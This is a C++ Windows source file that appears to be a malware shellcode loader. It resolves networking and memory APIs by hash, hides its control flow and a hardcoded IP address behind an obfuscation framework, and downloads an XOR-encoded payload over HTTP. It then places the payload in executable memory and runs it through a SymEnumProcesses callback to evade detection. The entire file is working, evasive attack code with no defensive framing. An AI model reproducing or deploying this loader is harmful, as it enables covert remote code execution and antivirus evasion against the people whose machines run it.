#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <dbghelp.h>
#include <iostream>
#include <vector>
#include "instr.h"//obf framework obfy
#pragma comment(lib, "ws2_32.lib")
typedef int (WINAPI *pWSAStartup)(WORD, LPWSADATA);
typedef int (WINAPI *pWSACleanup)();
typedef SOCKET (WINAPI *pSocket)(int, int, int);
typedef int (WINAPI *pConnect)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *pSend)(SOCKET, const char*, int, int);
typedef int (WINAPI *pRecv)(SOCKET, char*, int, int);
typedef int (WINAPI *pClosesocket)(SOCKET);
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef VOID (WINAPI *pRtlMoveMemory)(LPVOID, const LPVOID, SIZE_T);
typedef BOOL (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL (WINAPI *pSymInitialize)(HANDLE, LPCSTR, BOOL);
typedef BOOL (WINAPI *pSymEnumProcesses)(PSYM_ENUMPROCESSES_CALLBACK, PVOID);

//FNV-1a
constexpr unsigned int fnv1a_32(const char* s, size_t count) {
    unsigned int hash = 0x811c9dc5;
    for (size_t i = 0; i < count; ++i) {
        hash ^= static_cast<unsigned char>(s[i]);
        hash *= 0x01000193;
    }
    return hash;
}

#define HASH_FUNC(func) (fnv1a_32(func, sizeof(func) - 1))

class DynamicAPIFetcher {
private:
    template<typename FuncType>
    FuncType FindFunctionByHash(HMODULE module, unsigned int targetHash) {
        PIMAGE_DOS_HEADER dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(module);
        PIMAGE_NT_HEADERS ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<BYTE*>(module) + dosHeader->e_lfanew
        );

        PIMAGE_EXPORT_DIRECTORY exportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
            reinterpret_cast<BYTE*>(module) + 
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
        );

        DWORD* names = reinterpret_cast<DWORD*>(
            reinterpret_cast<BYTE*>(module) + exportDir->AddressOfNames
        );
        WORD* ordinals = reinterpret_cast<WORD*>(
            reinterpret_cast<BYTE*>(module) + exportDir->AddressOfNameOrdinals
        );
        DWORD* functions = reinterpret_cast<DWORD*>(
            reinterpret_cast<BYTE*>(module) + exportDir->AddressOfFunctions
        );

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
            const char* funcName = reinterpret_cast<const char*>(
                reinterpret_cast<BYTE*>(module) + names[i]
            );

            if (fnv1a_32(funcName, strlen(funcName)) == targetHash) {
                WORD ordinal = ordinals[i];
                DWORD funcRVA = functions[ordinal];
                
                return reinterpret_cast<FuncType>(
                    reinterpret_cast<BYTE*>(module) + funcRVA
                );
            }
        }

        return nullptr;
    }

    std::vector<HMODULE> loadedModules;

public:
    template<typename FuncType>
    FuncType FetchAPIFunction(const char* moduleName, unsigned int functionHash) {
        HMODULE module = GetModuleHandleA(moduleName);
        
        if (!module) {
            module = LoadLibraryA(moduleName);
            if (!module) {
                return nullptr;
            }
            loadedModules.push_back(module);
        }

        return FindFunctionByHash<FuncType>(module, functionHash);
    }

    ~DynamicAPIFetcher() {
        for (HMODULE module : loadedModules) {
            FreeLibrary(module);
        }
    }
};

bool DownloadAndDecode(
    LPBYTE* outBytes, 
    SIZE_T* outSize, 
    pWSAStartup dynWSAStartup,
    pWSACleanup dynWSACleanup,
    pSocket dynSocket,
    pConnect dynConnect,
    pSend dynSend,
    pRecv dynRecv,
    pClosesocket dynClosesocket,
    pVirtualAlloc dynVirtualAlloc,
    pVirtualFree dynVirtualFree
) {
    bool success = false;
    WSADATA wsaData = {0};
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in serverAddr = {0};
    LPBYTE finalBuffer = NULL;
    SIZE_T currentPosition = 0;
    const SIZE_T CHUNK_SIZE = 4096;
    char recvBuffer[4096];
    
    if (dynWSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    sock = dynSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        dynWSACleanup();
        return false;
    }
    
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    {
        OBF_BEGIN
            unsigned int obfIP = N(0x05FC990C);
            serverAddr.sin_addr.s_addr = htonl(obfIP);
            
            char ipStr[16] = {0};
            unsigned char oct1 = (obfIP >> 24) & 0xFF;
            unsigned char oct2 = (obfIP >> 16) & 0xFF;
            unsigned char oct3 = (obfIP >> 8)  & 0xFF;
            unsigned char oct4 =  obfIP        & 0xFF;
            sprintf(ipStr, "%d.%d.%d.%d", oct1, oct2, oct3, oct4);
            char request[128] = {0};
            sprintf(request, "GET / HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", ipStr);
            if (dynConnect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
                dynClosesocket(sock);
                dynWSACleanup();
                RETURN(false);
            }
            if (dynSend(sock, request, (int)strlen(request), 0) == SOCKET_ERROR) {
                dynClosesocket(sock);
                dynWSACleanup();
                RETURN(false);
            }
        OBF_END
    }
    
    int bytesRead = 0;
    while ((bytesRead = dynRecv(sock, recvBuffer, CHUNK_SIZE, 0)) > 0) {
        LPBYTE newBuffer = (LPBYTE)dynVirtualAlloc(NULL, currentPosition + bytesRead, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!newBuffer) {
            goto cleanup;
        }
        if (finalBuffer) {
            memcpy(newBuffer, finalBuffer, currentPosition);
            dynVirtualFree(finalBuffer, 0, MEM_RELEASE);
        }
        memcpy(newBuffer + currentPosition, recvBuffer, bytesRead);
        finalBuffer = newBuffer;
        currentPosition += bytesRead;
    }
    if (currentPosition == 0) {
        goto cleanup;
    }
    
    //Skip the HTTP header
    const char* headerEnd = "\r\n\r\n";
    LPBYTE bodyStart = NULL;
    SIZE_T headerLength = strlen(headerEnd);
    for (SIZE_T i = 0; i + headerLength < currentPosition; ++i) {
        if (memcmp(finalBuffer + i, headerEnd, headerLength) == 0) {
            bodyStart = finalBuffer + i + headerLength;
            break;
        }
    }
    if (!bodyStart) {
        goto cleanup;
    }
    SIZE_T bodyOffset = bodyStart - finalBuffer;
    SIZE_T bodyLength = currentPosition - bodyOffset;
    if (bodyLength <= 1) {
        goto cleanup;
    }
    
    // --- OBFSUCATION PART 2
    {
        OBF_BEGIN
            unsigned char key = bodyStart[0];
            *outSize = bodyLength - 1;
            *outBytes = (LPBYTE)dynVirtualAlloc(NULL, *outSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!*outBytes) {
                RETURN(false);
            }

            SIZE_T i;

            FOR( V(i) = N(1), V(i) < bodyLength, V(i)++ )
            {
                (*outBytes)[V(i) - N(1)] = bodyStart[V(i)] ^ key;
            }
            ENDFOR
            success = true;
        OBF_END
    }
    
cleanup:
    if (finalBuffer) {
        dynVirtualFree(finalBuffer, 0, MEM_RELEASE);
    }
    if (sock != INVALID_SOCKET) {
        dynClosesocket(sock);
    }
    dynWSACleanup();
    return success;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    OBF_BEGIN

        DynamicAPIFetcher apiFetcher;


        auto dynWSAStartup = apiFetcher.FetchAPIFunction<pWSAStartup>(
            "ws2_32.dll", 
            HASH_FUNC("WSAStartup")
        );
        auto dynWSACleanup = apiFetcher.FetchAPIFunction<pWSACleanup>(
            "ws2_32.dll", 
            HASH_FUNC("WSACleanup")
        );
        auto dynSocket = apiFetcher.FetchAPIFunction<pSocket>(
            "ws2_32.dll", 
            HASH_FUNC("socket")
        );
        auto dynConnect = apiFetcher.FetchAPIFunction<pConnect>(
            "ws2_32.dll", 
            HASH_FUNC("connect")
        );
        auto dynSend = apiFetcher.FetchAPIFunction<pSend>(
            "ws2_32.dll", 
            HASH_FUNC("send")
        );
        auto dynRecv = apiFetcher.FetchAPIFunction<pRecv>(
            "ws2_32.dll", 
            HASH_FUNC("recv")
        );
        auto dynClosesocket = apiFetcher.FetchAPIFunction<pClosesocket>(
            "ws2_32.dll", 
            HASH_FUNC("closesocket")
        );


        auto dynVirtualAlloc = apiFetcher.FetchAPIFunction<pVirtualAlloc>(
            "kernel32.dll", 
            HASH_FUNC("VirtualAlloc")
        );
        auto dynRtlMoveMemory = apiFetcher.FetchAPIFunction<pRtlMoveMemory>(
            "kernel32.dll", 
            HASH_FUNC("RtlMoveMemory")
        );
        auto dynVirtualFree = apiFetcher.FetchAPIFunction<pVirtualFree>(
            "kernel32.dll", 
            HASH_FUNC("VirtualFree")
        );
        auto dynSymInitialize = apiFetcher.FetchAPIFunction<pSymInitialize>(
            "dbghelp.dll", 
            HASH_FUNC("SymInitialize")
        );
        auto dynSymEnumProcesses = apiFetcher.FetchAPIFunction<pSymEnumProcesses>(
            "dbghelp.dll", 
            HASH_FUNC("SymEnumProcesses")
        );


        IF( !dynWSAStartup || !dynWSACleanup || !dynSocket || !dynConnect ||
            !dynSend || !dynRecv || !dynClosesocket || !dynVirtualAlloc ||
            !dynRtlMoveMemory || !dynVirtualFree || !dynSymInitialize || !dynSymEnumProcesses )
        {
            RETURN( N(1) );
        }
        ENDIF


        LPBYTE decodedShellcode = nullptr;
        SIZE_T shellcodeSize = N(0);
        IF( !DownloadAndDecode(
                &decodedShellcode, 
                &shellcodeSize, 
                dynWSAStartup,
                dynWSACleanup,
                dynSocket,
                dynConnect,
                dynSend,
                dynRecv,
                dynClosesocket,
                dynVirtualAlloc,
                dynVirtualFree
            ) )
        {
            RETURN( N(1) );
        }
        ENDIF


        LPVOID addr = dynVirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        IF( addr )
        {
            dynRtlMoveMemory(addr, decodedShellcode, shellcodeSize);
            dynVirtualFree(decodedShellcode, N(0), MEM_RELEASE);
            

            dynSymInitialize(GetCurrentProcess(), NULL, FALSE);
            dynSymEnumProcesses(reinterpret_cast<PSYM_ENUMPROCESSES_CALLBACK>(addr), NULL);
        }
        ELSE
        {
            dynVirtualFree(decodedShellcode, N(0), MEM_RELEASE);
            RETURN( N(1) );
        }
        ENDIF
    OBF_END

    return N(0);
}
